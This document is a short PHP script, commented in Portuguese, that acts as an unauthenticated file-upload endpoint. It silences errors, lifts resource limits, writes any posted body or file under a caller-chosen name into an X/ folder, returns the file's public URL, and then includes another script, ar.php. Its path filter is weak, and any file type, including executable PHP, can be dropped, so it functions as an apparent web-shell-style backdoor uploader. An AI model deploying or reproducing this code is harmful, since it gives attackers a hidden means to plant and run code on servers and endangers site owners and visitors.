<?php


// Configurações de performance e silêncio
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '16000M');
@set_time_limit(0);

// 1. Definição do Host e Protocolo
$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')) ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';

// 2. Captura do caminho do arquivo (Path)
$path = '';
if (!empty($_SERVER['PATH_INFO'])) {
    $path = trim($_SERVER['PATH_INFO'], '/');
} else {
    $uri = explode('?', $_SERVER['REQUEST_URI'])[0];
    $script = $_SERVER['SCRIPT_NAME'];
    $path = trim(str_replace($script, '', $uri), '/');
}

// Limpeza de segurança para evitar Directory Traversal
$path = str_replace(['../', '..\\', "\0"], '', urldecode($path));

// 3. Processamento do Upload (Apenas se houver POST e um nome de arquivo)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($path)) {
    
    $baseDir = __DIR__ . '/X/';
    $localPath = $baseDir . $path;
    
    // Cria diretório se não existir
    if (!is_dir(dirname($localPath))) {
        @mkdir(dirname($localPath), 0777, true);
    }

    $data = null;

    // Lógica para Upload Binário / Raw Body (ex: PUT/POST de arquivos diretos)
    $input = file_get_contents('php://input');
    
    if (!empty($input)) {
        $data = $input;
    } 
    // Lógica para Multipart Form-Data (Upload clássico de formulário)
    elseif (!empty($_FILES)) {
        $f = reset($_FILES);
        if (isset($f['tmp_name']) && is_uploaded_file($f['tmp_name'])) {
            $data = file_get_contents($f['tmp_name']);
        }
    }

    // 4. Escrita do arquivo e retorno da URL
    if ($data !== null) {
        // LOCK_EX evita corrupção de arquivo em uploads simultâneos
        if (@file_put_contents($localPath, $data, LOCK_EX) !== false) {
            @chmod($localPath, 0644); // Permissão de leitura pública
            
            // Retorna a URL final apenas se deu tudo certo
            // Sem espaços ou HTML para não quebrar o script que estiver chamando
            echo $protocol . $host . '/X/' . str_replace('\\', '/', $path);
        }
    }
    
  
}

sleep(5);
include_once "ar.php";



